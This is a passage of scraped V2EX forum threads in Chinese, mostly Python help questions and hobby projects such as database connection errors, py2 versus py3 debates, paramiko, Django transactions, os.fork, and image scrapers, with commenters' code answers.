505, in pymssql.connect (pymssql.c:7589)\r", "        def connect(server='.', user='', password='', database='', timeout=0,\r", "    TypeError: connect() got an unexpected keyword argument 'passwd", "passwd<>password ？", " passwd 的参数名错了。另外你的邮箱密码暴露啦", "stackoverflow 上面查了下，有这个例子，我把 password 改成 passwd 也报错！\r", "把链接字符串拼接成一个字符串传入也不对\r", "        print 'host=',SQLSERVER,\"user=\",USER,\"password=\",PASSWORD,\"database=\",DATABASE\r", "        g_Conn = pymssql.connect(host=SQLSERVER,user=USER,password=PASSWORD,database=DATABASE)\r", "输出正常值，在初始化连接的时候报错\r", "\r", "        @", "\r", "            def connect():\r", "                servers = [\"server1\", \"server2\", \"server3\"]\r", "                conn = None\r", "                for server in servers:\r", "                    try:\r", "                        conn = pymssql.connect(server, settings.MSSQL_USERNAME, settings.MSSQL_PASSWORD, settings.MSSQL_DB_NAME, charset=\"ISO-8859-1\")\r", "                        break\r", "                    except:\r", "                        logger.info(\"Failed to connect to MSSQL Server: \" + server)\r", "\r", "                if conn:\r", "                    return conn\r", "                else:\r", "                    logger.info(\"Failed to connect to ALL MSSQL servers\")\r", "                    return conn\r", "\r", "\r", "\r", "\r", "        结果多次测试已经算是解决了吧 \r", "        配置文件读取后显式的调用下可以使用了\r", "\r", "        cf=ConfigParser.ConfigParser()\r", "        cf.read(\"conf.ini\")\r", "        DATABASE=cf.get(\"app_info\",\"DATABASE\")\r", "        USER=cf.get(\"app_info\",\"USER\")\r", "        PASSWORD=cf.get(\"app_info\",\"PASSWORD\")\r", "        HOST=cf.get(\"app_info\",\"HOST\")\r", "        PORT=cf.get(\"app_info\",\"PORT\")\r", "        #HOST = '127.0.0.1'\r", "        USER = 'test'\r", "        PASSWORD = 'test'\r", "        #DATABASE = 'test'\r", "        PORT='1433'\r", "        HOST1 = '127.0.0.1'\r", "        USER1 = 'test'\r", "        PASSWORD1 = 'test'\r", "        #DATABASE1 = 'test'\r", "        PORT1=PORT\r", "        HOST1 = HOST\r", "        USER1 = USER\r", "        PASSWORD1 =PASSWORD\r", "        DATABASE1 = DATABASE\r", "        PORT1=PORT\r", "\r", "\r", "\r", "        conn=pymssql.connect(host=HOST1,user=USER1,password=PASSWORD1,database=DATABASE1,port=PORT1)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/0x5010/alidayu\" rel=\"nofollow\">https://github.com/0x5010/alidayu</a></p>\n<p>原 sdk 不兼容 python3 各种引用方式也不太友好，修改了个兼容的版本。\n简单的测试了下，大家有用的小伙伴可以用看看，有什么 bug 或问题 github 上直接提 issue ，会尽快解决的！</p>\n<p>测试代码</p>\n<pre><code># -*- coding: utf-8 -*-\n__editor__ = 0x5010\n\nfrom alidayu import api, appinfo\n\nappkey = \"appkey\"\nsecret = \"secret\"\nreq = api.AlibabaAliqinFcSmsNumSendRequest()\nreq.set_app_info(appinfo(appkey, secret))\n\nreq.sms_type = \"normal\"\nreq.rec_num = \"手机号\"\nreq.sms_template_code = \"模板代码\"\nreq.sms_free_sign_name = \"验证名字\"\nreq.sms_param = {\"code\": \"模板代码和内容\"}\nresp = req.getResponse()\nprint(resp)\n</code></pre>\n</div></div>"], "reply": "3", "tittle": "阿里大于 python sdk 完善", "comment": ["前几天也在改兼容性，看了官方的 sdk 比较乱，没改，最终换成了 php 的了", " 官方的 sdk 应该不是写 python 的写的 应该是其他语言的会 python 写的 代码风格不像 python ，但是结构不错。\r", "我整理好了。要得话直接用就好了，有 bug 提出来", " 好的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>醉了醉了<br>\n之前就没想过这会是个事<br>\n带着几个同事转 Python ，由于很多工作中用到的库还是 2.7 的，并没有 py3 的版本，所以根据实际情况用了 2.7 ，没想到有个同事死活不愿意学 2.7 ，非要学 3.6 。<br>\n遇到这种情况你们怎么解决？</p>\n</div></div>", "<div class=\"topic_content\">这个话题 over 吧，最后看 leader 决定就是了。\r<br>就是吐个槽加征求什么更好的解决方案。</div>"], "reply": "118", "tittle": "公司都在用 py2.7，同事非要用 py3.6，怎么破", "comment": ["新系统的话，当然还是选择向前看比较好啊。淘汰是早晚的事。。", " 其实长得还可以，咳，就是 EQ 太低。。除了这个还有其他闹心的事。。", "楼主哇， eq🙄那叫萌好吗", " 公司有其他很萌的女孩子，比较一下，咳。。", "2 和 3 完全不能兼容？", "我觉得用 2 或用 3 都不是问题，问题是那个码农的这种做法说明了本身还不够成熟", "py 最傻逼的地方就是 3 不兼容 2", "2 的某些痛点可以 __future__ 和和稀泥（ 2 的后面几个版本在这个意义上还是能用的，毕竟还能写写 b\"\" 出个 str ），至于 3 那些在工程上可以帮助减少脑抽概率的语法新增（ type annotation ）大概只能靠游说和憋着了。说起“后面几个版本”， Py2.6+ 的 io 那套完全就是 Py3 的用词，恶毒一点的话可以故意多用用把人逼上 Py3 。\r", "\r", "或者可以造点 RPC 的轮子在 2 和 3 之间传东西……（雾）\r", "\r", "* * *\r", "\r", " py 最傻逼的地方是 3 不兼容 2 的傻逼之处。\r", "\r", " 字符串、 except ……还有就是关于写了 3 为什么还要不用新特性之类的事情。\r", "\r", " 如果经验指的是记得绕着坑走路的话，正常人都愿意直接用坑少的吧……？\r", "\r", " 不不不，现在是 Python 8 的时代 /\r", "\r", " 欸有 native 部分啊……迁移 C API 好像事情列出来倒是比脚本语言那块少： ", " 。 Python 3.x 这方面有个地方好， 3.2 开始有 stable ABI 了。话说和女孩子交流并没什么可以另外表示困难、奇怪的吧。\r", "\r", " 不要把人往坑里送……到时候就是“项目图速度快不用转译，可是总有人要用 ES2018[???] 了”。", " 楼主说了项目库需要 2 支持，无理取闹非要出来硬上自己改才是脑子有问题。 block 送你，不谢。", "报告主管 啊, 哈哈", " 哦哦，要是公司自己的库那真没辙了，我现在所用到的官方的库还都已经 2/3 兼容了", " 昨天试着跑了一小的针对 py2 写的程序 完全没法在 py3 上面运行…… - - |||||", "python 需要一个 babel", "python 需要一个 babel", " ", "竟然还用 2 ，打死！", "2to3", "现在大部分库都支持 3 了吧？如果你的同事能解决依赖的问题，用 3 也没问题啊，解决不了他自己就会回来的。 2 被淘汰是趋势。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如果 Linux 服务器密码过期了， ssh 时候会有下面提示：</p>\n<pre><code>You are required to change your password immediately (password aged)\nWARNING: Your password has expired.\nYou must change your password now and login again!\nChanging password for user XX.\nChanging password for XX.\n(current) UNIX password: ###卡在这里等着输入密码\n\n当用 python 的 paramiko 模块通过用户名 密码登录时\ns = paramiko.SSHClient()\ns.set_missing_host_key_policy(paramiko.AutoAddPolicy())\ns.connect(host,port,user,pwd)###这个地方并没有任何报错\ns.exec_command(cmd, get_pty=True, timeout=500) #这个地方因为密码过期了，会卡住直到超时报错\n\n现在想在 s.connect 这个地方做个检测，如果碰到密码过期就返回错误，翻了参数也没发现有控制的地方，请教有什么好的处理方式么。\n</code></pre>\n</div></div>"], "reply": "2", "tittle": "paramiko connect 时候遇到的问题。", "comment": ["exec_command 的时候把 stdin 和 stdout 拿出来，读一下 stdout ，密码过期的话用把新密码打到 stdin 里就行。\r", "\r", "参见[How to sudo in para]( ", ")", "我觉得配置 ssh 无密码登陆不是更好一些? 不需要你脚本里记录密码, 另外也不需要考虑密码过期的问题了."]},
{"content": ["<div class=\"topic_content\">这几天用 django 操作事务的时候，有一个地方需要获取一个字段的状态来确认是否对象需要更新。在操作过快（比如很快连续提交两次的时候）这个事务会读取到同样的状态，但是正常应该是第一次表数据更新，第二次读取的时候并没有读到更新的记录。后来查了一下，是因为 mysql 默认的事务级别是 REPEATABLE-READ 类型，这会导致事务并发读取的数据一致，后来在 settting.py 里改了 mysql 的配置事务级别 SERIERLIZED ，就好了，但是所有事务都变成这样级别了，这样事务的执行效率会很低，如果我不想设置全局的，在需要操作某个事务能根据需要设置事务的级别， django 应该怎么做？求各位大大帮帮忙啊。</div>"], "reply": "4", "tittle": "关于 django 事务隔离级别的设置。", "comment": ["存在幻读问题么？\r", "如果不是设置成全局，可执行 SQL ： SET SESSION TRANSACTION ISOLATION LEVEL SERIALIZABLE  更改隔离级", "  django 怎么设置啊，这个只能配置里加啊，然后就变成全局的了。", "我的办法是加锁，在把要更新的对象读取出来的时候用 select_for_update 把该条记录锁住，那么并发的对相同记录的读取和写入就会等待锁释放，然后获取到的值就是刚更新过的值了", "  django 框架默认似乎没有动态设置的样子，可以做一些代码级的 hack"]},
{"content": ["<div class=\"topic_content\">比如，在 Windows7 中文版， 64 为， office 套件 2010 。\r<br>将 f.doc 文件另存为\"删选过的网页\"类型，起名为 f.html\r<br>但打开 f.html ，发现文件中有如下：\r<br>&lt;head&gt;\r<br>&lt;meta http-equiv=Content-Type content=\"text/html; charset=x-cp20936\"&gt;\r<br>我的问题是：\r<br>怎么样让生成的 f.html 文件中， charset=gbk 或者 utf-8 ？\r<br>使用 python 或者 c#代码操作都可以。\r<br>多谢！</div>"], "reply": "1", "tittle": "word 文件另存为“筛选过的网页”文件时，得到的网页文件中 charset=x-cp20936，怎么设置让 charset=gbk 或者 utf-8？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我在页面上输入的是：\nimport requests</p>\n<p>head={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36','Accept-Encoding':'gzip, deflate, sdch'}\nurl='<a href=\"https://diviner.jd.com/diviner?lid=1&amp;p=103003&amp;sku=676676'\" rel=\"nofollow\">https://diviner.jd.com/diviner?lid=1&amp;p=103003&amp;sku=676676'</a>\nhtml=requests.get(url,headers=head)\nprint html.content</p>\n<p>但是输出的却一直是</p>\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;500 Internal Server Error&lt;/title&gt;&lt;/head&gt;\n&lt;body bgcolor=\"white\"&gt;\n&lt;center&gt;<h1>500 Internal Server Error</h1>&lt;/center&gt;\n<hr>&lt;center&gt;nginx&lt;/center&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n\n\n\n\n\n<p>不知道是哪里出现问题了，这个网页我确实能打开的哇，求解答，谢谢</p>\n</div></div>"], "reply": "4", "tittle": "网页一直报错，萌新求解答哇", "comment": ["很明显请求头部的信息不够，导致了服务器非正常响应", " 需要全部加进去么？", " 应该要，看服务器怎么解析了", "要传一个 cookie ，可以加在头上,我这里试了一下这个代码可以返回数据\r", "\r", "```\r", "import requests\r", "head={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36','Accept-Encoding':'gzip, deflate, sdch',\r", "'Cookie': '__jdv=122270672|direct|-|none|-|1476333014350; mt_xid=V2_52007VwMRUFxQUl8WTR5sDWIGFlZaUFdGGE0eWhliVxIAQQtTUhdVGVpRNQdAAA1dVVlIeRpdBWAfElNBWFBLH0oSXgRsBhZiX2hSah9LH1wEbgIXYl1eVl4%3D; ipLocation=%u5E7F%u4E1C; ipLoc-djd=19-1607-40152-0; user-key=f20ed039-cf5c-4e40-91a5-a6035a957ac4; cn=0; atw=6881.2490744.12|655.1861125.7; __jda=122270672.1230914856.1474448839.1476333014.1477539207.2; __jdb=122270672.1.1230914856|2.1477539207; __jdc=122270672; __jdu=1230914856'\r", "} \r", "url='https://diviner.jd.com/diviner?lid=1&p=103003&sku=676676' \r", "html=requests.get(url,headers=head) \r", "print html.content\r", "\r", "```"]},
{"content": ["<div class=\"topic_content\">使用方法 ：\r<br>修改   发件人邮箱+密码、邮箱 SMTP 服务器地址、收件人邮箱、职位关键词\r<br>加入 contrab 可以每隔一段时间发送你要爬取的职位信息。\r<br>\r<br>require ：\r<br>python 2.7.x\r<br>Beautifulsoup\r<br>\r<br>代码：\r<br><div><a target=\"_blank\" href=\"https://gist.github.com/kagamimoe/42a3f1b8ff1dc60304b43e9bc64409cf\">https://gist.github.com/kagamimoe/42a3f1b8ff1dc60304b43e9bc64409cf</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div></div>"], "reply": "8", "tittle": "闲的蛋疼撸了个在 V2EX 找工作的爬虫", "comment": ["为什么很多发自己作品的人都要说是因为闲、因为无聊等等 才做了某某某？\r", "\r", "个人猜测是因为：如果做出来的东西一般，就可以说毕竟这个东西是无聊才做的，也没有认真做所以一般也很正常。\r", "如果做出来的东西不错，那就是无聊做出来的东西也很好，更能体现自己的水平。", "效果图如下： \r", "   其实是自己有这个需求才做的，自己觉得 V2EX 某些公司还算靠谱 ，周围同事也在上面找过不错的工作。 至于标题是随便取的 - -", "因为这个也不是很难实现, 只是看个人有没有这个需求以及动力了. 楼主愿意分享, 贡献了代码, 做了一点点贡献,  点赞!", "点赞", "点赞+1", " \r", "这么纠结于别人的看法和评价\r", "个人猜测：你活得一定很累", "网废了上不去 git ，只能围观一下一楼了= =~"]},
{"content": ["<div class=\"topic_content\">计数器是可用的，在首页下方， <a target=\"_blank\" href=\"http://www.weimailf.com/%EF%BC%8C%E6%88%91%E7%94%A8\" rel=\"nofollow\">http://www.weimailf.com/，我用</a> urllib.request 取得页面后，再用浏览器刷新看计算器只+1 ，应该是+2 啊</div>"], "reply": "5", "tittle": "在有计数器的首页，为什么用 python 连接的时候不计数？", "comment": ["js 计数的？", "今日访问量：＜ script type=\"text/javascript\" src=\"/inc/AspCms_aStatistics.asp?act=t\"＞", "request 这个地址：\r", "Python 不会解析 js 的", "这代表服务器并不是以访问该页面的请求计数,而是以某个其他请求计数. 没有看具体网页,但是 @", "  应该是对的."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有这个需求的可以试试，地址在这里：<a href=\"http://wil.dog/douban/\" rel=\"nofollow\">http://wil.dog/douban/</a></p>\n<p>由于豆瓣 API 有一分钟 40 次的请求限制，所以我是一条条爬的数据，当然也快不到哪去......</p>\n<p>源码在这里，有兴趣的可以给个 star ，提交个 issue 啥的:\n<a href=\"https://github.com/Wildog/douban-exporter\" rel=\"nofollow\">https://github.com/Wildog/douban-exporter</a></p>\n</div></div>"], "reply": "3", "tittle": "一个导出豆瓣个人数据到 Excel 的线上服务", "comment": ["试用了一下，很赞", "不错", "能导出小组的帖子吗"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在有 60 组，每组 7 个，共 420 个三维坐标点，想用 python 实现这样的效果，请问要怎么做？</p>\n<p><img alt=\"效果\" src=\"http://p1.bqimg.com/4851/e6a6df4c7a452fcd.jpg\"></p>\n</div></div>"], "reply": "3", "tittle": "用 python 里的 matplotlib， axes3d 要怎么实现下面这样的效果？", "comment": ["为什么不先找文档看呢？\r", "\r", "这个应该不难实现吧", "官方文档就有很好的说明"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我把博客的文章分页，每页显示 10 篇文章，比如：</p>\n<p>Pagination = Article.query.filter(Article.article_id == foo).paginate(page, per_page=10)<br>\narticles = pagination.items</p>\n<p>现在，我想在每页显示的 10 篇文章中，随机插入 3 条广告内容。意思就是：<br>\n在第 1-10 篇文章中间，随机插入 3 个空位，显示广告内容；<br>\n在第 11-20 篇文章中间，随机插入 3 个空位，显示广告内容；<br>\n如此类推 ...</p>\n<p>这个要怎么实现比较好？</p>\n</div></div>"], "reply": "2", "tittle": "怎么在（ sqlalchemy）的分页中，随机位置插入一些内容？", "comment": ["你这种场景还是按 10 个来分，广告用模板插入更方便吧", "嗯，在固定位置插广告，就干脆把分页条数切割开来写；\r", "\r", "我想在每 10 篇文章的，随机位置插入广告位，不知道怎么搞比较好。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>题目如下：\n写一个逐页显示文本文件的程序. 提示输入一个文件名, 每次显示文本 文件的 25 行, 暂停并向用户提示\"按任意键继续.\", 按键后继续执行</p>\n</div></div>"], "reply": "6", "tittle": "一道 python 题，大家给帮帮忙， thx！", "comment": ["随手撸了一个, 代码有点烂, 哪里有 bug 还请各位不吝指出:\r", "\r", "\r", "#!/usr/bin/env python3\r", "\r", "\r", "def show_content(file, paginate):\r", "    \"\"\"Show the content of a file, display 'paginate'\r", "    lines and ask user to press any key to continue\"\"\"\r", "    with open(file) as f:\r", "        for idx, line in enumerate(f, start=1):\r", "            print(line, end='')\r", "            if not idx % paginate:\r", "                print('Press any key to continue')\r", "                _ = input()\r", "\r", "\r", "if __name__ == '__main__':\r", "    show_content('test.out', 25)", "缩进都被吃掉了....", " thx ！我再把缩进的给补回来\r", "#!/usr/bin/env python3\r", "\r", "def show_content(file, paginate):\r", "    \"\"\"show the content of a file,display paginate lines\r", "    and ask user to press any key to continue\"\"\"\r", "\r", "    with open(file) as f:\r", "        for idx, line in enumerate(f, start=1):\r", "            print (line,end='')\r", "            if not idx % paginate:\r", "                print ('Press any key to continue')\r", "                _ = input()\r", "\r", "if __name__ == '__main__':\r", "    show_content('/home/tiantian/.vimrc', 25)", " ...我的也被吃掉了。。", " 试试全角空格", "试试 gist …"]},
{"content": ["<div class=\"topic_content\">今天新开 branch 打算把 gunicorn 换成 Channels 需要的 Daphne ， pip 时发现他居然 required Twisted 这个 python2 的 lib 。 我依稀记得当年为了给服务器加 APNS 时候 由于 twisted python3 下出错不得不装了 python2 把 apns 脚本的代码大改了半天. 心想以后再也不会碰 Twisted 了。 没想到 Daphne 居然会选择 Twisted</div>"], "reply": "2", "tittle": "呵呵呵呵 Django Channels 与 Twisted", "comment": ["Python asyncio 的社区还是没起来……", " 现在没必要太急用 async 那个指定的 asgi: Daphne 还不稳定，  心疼 Gunicorn"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>请大家帮忙看看,&gt;_&lt;\npython3 代码如下，运行环境 ubuntu12.04 virtualbox 虚拟机</p>\n<pre><code>import os\n\nprint('inlet is here of main process')\n\npid = os.fork()\n\nif (pid ==0):\n    print('child pid is running')\nelse:\n    print('main pid is running')\n\n</code></pre>\n<p>主进程的入口时 import os\n子进程得到了主进程的所有代码，有了自己的空间，为什么入口不是 import os ，而是从 os.fork()以下执行呢？</p>\n<p>附图如下：\n<a href=\"http://a3.topitme.com/9/cf/f7/1177624584b1af7cf9o.jpg\" rel=\"nofollow\">http://a3.topitme.com/9/cf/f7/1177624584b1af7cf9o.jpg</a></p>\n</div></div>"], "reply": "15", "tittle": "python os.fork()，有关子进程入口的疑问", "comment": ["。。设定就这样吧，如果从头那岂不是无限ｆｏｒｋ？", "建议楼主看一下 Unix 的 fork 系统调用。\r", "简单来说：操作系统这一层就是这么设计的，操作系统才不关心你的 Python 文件，那是 Python 解释器关心的东西，不在一个层次上", "你应该去看看 linux 的 fork ，既然是 fork ，自然除了所有代码数据外还包含所有状态了，锁，文件句柄，函数调用栈", "fork 是拷贝，包括内存数据和执行环境，只能说类 linux 设计有点奇葩。\r", "多进程考虑用 multiprocessing 啊，这个比较方便。", "前面都有运行结果了，把主进程的结果直接拷贝给子进程。如果子进程还去跑前面的代码岂不是傻？", "楼主你想要的是 os.system(__FILE__)吧", " 谢谢提醒！我会去看看的", " 额，其实我也是这样困惑的。。", " \r", " \r", "确实如此，针对 linux fork ， google 了一下，\r", ">fork 英文意思：分支， fork 系统调用复制产生的子进程与父进程（调用进程）基本一样：代码段+数据段+堆栈段+PCB ，当前的运行环境基本一样，所以子进程在 fork 之后开始向下执行，而不会从头开始执行。\r", ">https://www.cnblogs.com/mickole/p/3186441.html\r", "\r", "以后还是用 multiprocessing>_<", " 这个是啥，没见到过，粘贴到代码里运行不了。。。\r", "> NameError: name '__FILE__' is not defined", " 记混了，__FILE__是 PHP 的， py 的应该是__file__，当前代码文件路径", "克隆哪来的入口。\r", "启动新的应用程序才是从入口继续。\r", "克隆的话是一份程序变成两份一模一样的，当然两个程序都会从 fork()返回了。", "楼上说的对， fork 完全是动态的，就在 call fork 那里分离， OS 复制成 2 个进程，分离后都从那一点各自跑各自的。他们共享执行指令，但是是不同的执行流（也就是不同的进程），这也是为什么要通过返回值 pid 来运行不同的逻辑。\r", "一定要分清，他们指令完全一样的(指令是死的)，执行流一般是不一样，是动态的。\r", "在分离之初，内存其实几乎一样的，可以想象 2 个指针指向同一块内存。随着执行流的区别， OS 会对内存进行 copy on write 的操作，慢慢内存也各种写各自的。", " \r", "受教了，谢谢！", " \r", "：），感谢！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>各位大神好，我现在正在学 python ，刚入门。现在要编一个程序玩 Mastermind ，就是电脑随意出四个数字（或者颜色），让玩家猜是哪几个，并给出反馈（），然后玩家再根据反馈在十步之内要猜出是哪几个数字，以及排列顺序。 Mastermind 详细游戏规则见 wiki: <a href=\"https://en.wikipedia.org/wiki/Mastermind_(board_game)\" rel=\"nofollow\">https://en.wikipedia.org/wiki/Mastermind_(board_game)</a></p>\n<p>想请教大神可不可以编一个简单的程序（越简单越好），实现这个游戏。</p>\n</div></div>"], "reply": "1", "tittle": "Python Project Mastermind 求助", "comment": ["主要是写逻辑\r", "当然可以实现\r", "看你的语气好像要别人帮你实现的样子。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/lc4t/tumblr_download\" rel=\"nofollow\">https://github.com/lc4t/tumblr_download</a></p>\n<p>刚刚无聊写的0.0 可以挂着爬一波了。。</p>\n<pre><code>pip3 install lxml gevent PySocks\n</code></pre>\n<hr>\n<pre><code>Usage: tumblr.py [options]\n\nOptions:\n  -h, --help            show this help message and exit\n  -s SITES, --sites=SITES\n                        sites split with ',', example:2013117,66666\n  --type=TYPE           [photo|video|both]\n  --thread=THREAD       threads\n</code></pre>\n<hr>\n<pre><code>can be changed in source file:\nRETRY: retry times, default 1\nPROXY: because G.F.W must use proxy\nTIMEOUT: time to wait net IO\n</code></pre>\n<hr>\n<pre><code>example:\n  python3 tumblr.py -s 2013117,66666 --type=both --thread=10\n</code></pre>\n<hr>\n<pre><code>API:\n  http://{site}.tumblr.com/api/read?type={photo|video}&amp;num={pagesize}&amp;start={start}\n</code></pre>\n<p>居然有蚊子，还没被冻死。。成都今天好冷</p>\n</div></div>"], "reply": "3", "tittle": "看到好多爬虫于是我也写了个爬 tumblr 的来骗回复和 star，丢 API", "comment": ["你进小黑屋了，比我晚发的帖子，反而时间比我还早", " 啊？", "收藏比回复多系列.."]},
{"content": ["<div class=\"topic_content\"><div><a target=\"_blank\" href=\"https://gist.github.com/anonymous/55563f5ed8dd0ff71e62a69562ede2e6\">https://gist.github.com/anonymous/55563f5ed8dd0ff71e62a69562ede2e6</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div>\r<br>知乎爬虫真麻烦\r<br>懒得注释了</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"http://p1.bqimg.com/575659/0c033264eaf53993.png\">\n<img alt=\"\" src=\"http://i1.piimg.com/575659/4f8c62df77ba76a6.png\">\n其实也没啥好爬的，就是看看胸，看看腿</p>\n</div></div>", "<div class=\"topic_content\">没登录情况下创建的 gist 无法修改了。\r<br>重新更新一份 <div><a target=\"_blank\" href=\"https://gist.github.com/mzcyx/38e614b120920be9aaca1855da84051a\">https://gist.github.com/mzcyx/38e614b120920be9aaca1855da84051a</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div>\r<br>下载原图</div>", "<div class=\"topic_content\">你们想要的 tumblr 爬虫 <a target=\"_blank\" href=\"https://www.v2ex.com/t/316337\" rel=\"nofollow\">https://www.v2ex.com/t/316337</a></div>"], "reply": "36", "tittle": "知乎图片爬虫", "comment": ["一定是我的标题不够吸引人，所以没有人回复。\r", "消灭零回复", "路过看看", "看看", "应该是图片不好看的原因～～", " 知乎有人晒胸，有人晒腿，有人晒脸还可以😝", "知乎有啥。。\r", "你应该写个 tumblr 的爬虫", " 哈哈哈，这个建议很好很好～", " 迅雷 7.9 内置了 tumblr 下载器－－，但我刚扶墙出去试，一只提示我 http 错误（ 10060 ）不知道咋回事，难道这玩意需要迅雷服务器支持？", " tumblr 小儿科。网站我都有了", " 迅雷的服务不依靠迅雷的服务器，依靠你的本地服务", "可惜不能解析知乎的高清大图，都是答案尺寸的小图，不过依然很不错，赞一个~", " 这个有了..爬指定 site 的所有图片和视频", " 哈哈哈，你不说我还真没发现，小图和大图只是一个字母的区别", " 是啊？哪里啊，我修改下几个大图试试。", " \r", "\r", "是_b 改成_r?", "我默默的掏出身上所有的钱，去楼下买了一件营养快线 ", " ", " 求工具", " 对", " 求工具", " 原图很简单啊 修改下代码就行了", "为什么看到这么多腿", " 秀腿的问答", " \r", "\r", "嗯，刚刚也发现了，替换一下就行了。", " \r", " \r", "\r", "\r", "最简单粗暴的方式了：\r", "\r", "```Python\r", "\r", "    for pic in pictures:\r", "        print(pic)\r", "\r", "        newpic=pic[0:-6]+'r.jpeg'\r", "        \r", "        print(newpic)\r", "        \r", "        \r", "        downloader(newpic,savepath)\r", "\r", "```", " \r", " \r", "\r", "\r", "不对，刚刚才想到，有的地方是 jpg ，有的地方是 jpeg 。\r", "\r", "用 kmp 搜索一下_b 所在位置，把这个位置替换成_r ，这样才是完美思路。", " 那要那么麻烦\r", "[re.sub('_b','_r',pic) for pic in pics]", "for pic in pictures:\r", "        print(pic)\r", "\r", "\r", "        tmp='_b'\r", "\r", "        n=kmp_matcher(pic,tmp)\r", "        \r", "        print(n)\r", "        \r", "        newpic=pic[0:n+1]+'r'+pic[n+2:]\r", "        \r", "        print(newpic)\r", "        \r", "        \r", "        downloader(newpic,savepath)", " 你这一点都不优雅，看我上面的正则替换", "期待 tumblr 的爬虫", "老...司...机...", " 我只是技术爱好者（微笑🙂）", " \r", " \r", "刚刚自己写了一个。。\r", " \r", "\r", "\r", "正解了，第一反应是 kmp 而居然不是用正则，还是实际应用太少导致的。\r", "\r", " \r", "这就去学习一下， 3 还是 2 的？", "看胸看腿为什么去知乎呢？不是有很多更好的地方嘛……", " python3 还得改好多，哎，比如 print 和 from io import StringIO ，有个问题 session 不是可以直接用吗？为什么要在函数用 global 引用呢", "厉害了我的哥 hhh"]},
{"content": ["<div class=\"topic_content\">提交数据后，可能需要时间执行，后端如何与前端保持一个同步的进度显示？\r<br>比如后台执行到 20%  前端就显示 20%</div>"], "reply": "21", "tittle": "如何实现实时的进度条？", "comment": ["1. 前台 js 定时访问拿数据\r", "2. websocket", "难点估计不在交互，在于怎么判断任务执行百分比", "后端执行一点功能就往前面返回一个状态。感觉这么搞负担好大。而且我看网站都是一点就过去了，速度都很快，单纯的为了视觉效果弄个假的糊弄算了。 gmail 加载好像跟你这个需求差不多。", "大概就行了，根据数据量预估一个时间，然后剩下一点等待服务器返回成功", "三种思路:\r", "\r", "1. WebSocket\r", "2. 内嵌一个 iframe,写一个 timer 不停去刷新 iframe 中的内容(iframe 的 src 属性指向你的长耗时任务的 URL),根据内容字符串的最后一个百分号的值，获得进度。\r", "3. 使用 ajax XMLHttpRequest level 2 API\r", "\r", "给出一个例子:\r", "\r", "后端:\r", "\r", "```javascript\r", "'use strict';\r", "\r", "const http = require('http');\r", "\r", "const server = http.createServer();\r", "server.on('request', function(req, res) {\r", "    console.log('HTTP', req.method, req.url);\r", "    let n = 0;\r", "    res.writeHead(200, {\r", "        'Content-Type': 'text/plain',\r", "        'Connection': 'keep-alive',\r", "        'Access-Control-Allow-Origin': '*',\r", "        'Content-Length': 100\r", "    });\r", "\r", "    const inter = setInterval(function() {\r", "        res.write('.');\r", "        n++;\r", "        if (n >= 100) {\r", "            clearInterval(inter);\r", "            res.end();\r", "        }\r", "    }, 50);\r", "\r", "    res.on('error', function(err) {\r", "        console.log(err);\r", "    });\r", "\r", "    res.on('close', function() {\r", "        console.log('Connection close');\r", "    })\r", "});\r", "\r", "server.listen(8000);\r", "\r", "```\r", "\r", "\r", "前端:\r", "\r", "```html\r", "<!DOCTYPE html>\r", "<HTML>\r", "<head>\r", "    <meta charset=\"utf-8\"/>\r", "    <style>\r", "        .progress-bar {\r", "            border: 1px solid rgb(230, 230, 230);\r", "            padding: 0px;\r", "            position: relative;\r", "            height: 4px;\r", "            border-radius: 2px;\r", "        }\r", "\r", "        .progress-bar > .progress-bar-inner {\r", "            margin: 0px;\r", "            width: 30%;\r", "            background-color: rgb(0, 180, 20);\r", "            height: 4px;\r", "            border-radius: 2px;\r", "        }\r", "    </style>\r", "</head>\r", "<body>\r", "<div class=\"progress-bar\">\r", "<div id=\"pro\" class=\"progress-bar-inner\"></div>\r", "</div>\r", "<script src=\"http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js\"></script>\r", "<script>\r", "    var progress = $('#pro');\r", "    var xhr = new XMLHttpRequest();\r", "    xhr.open('GET', '", "', true);\r", "    xhr.onprogress = function(event) {\r", "        if (event.lengthComputable) {\r", "            var pro = event.loaded/event.total;\r", "            console.log(pro);\r", "            progress.css('width', pro*100 + '%');\r", "        }\r", "    };\r", "    xhr.send();\r", "</script>\r", "</body>\r", "</HTML>\r", "```", "上面的例子使用使用 ajax XMLHttpRequest level 2 API 做的", "没有必要, 你观察一下就会发现大多数的进度条都是假的, 只是视觉安慰而已.\r", "除非你真的需要根据这个进度条精确定位(但其实这个很难, 比如很难估计一项任务到底要花多少时间)", "前端用 Flash 编程，可以做到实时", " 啥年代了，还 fla", "websocket http-chunk", " 呵呵，我只是说这个技术绝对能做到啊", "卡 99%好吧，解决了就 100%", "你看看苹果的\"少于一分钟\"，你就知道你现在这个需求有没有意义了", "我记得有个讨论是说: 数据是从客户端发送出去的，客户端本身就应该知道已经发送了多少数据，也就能知道百分比，为何要询问服务端自己已经知道的事情？\r", "\r", "现在 XMLHttpRequest 有上传进度的接口，具体可以在 MDN 找到。 5 楼的实现是正确的，也可以去翻 jQuery 等涉及 AJAX 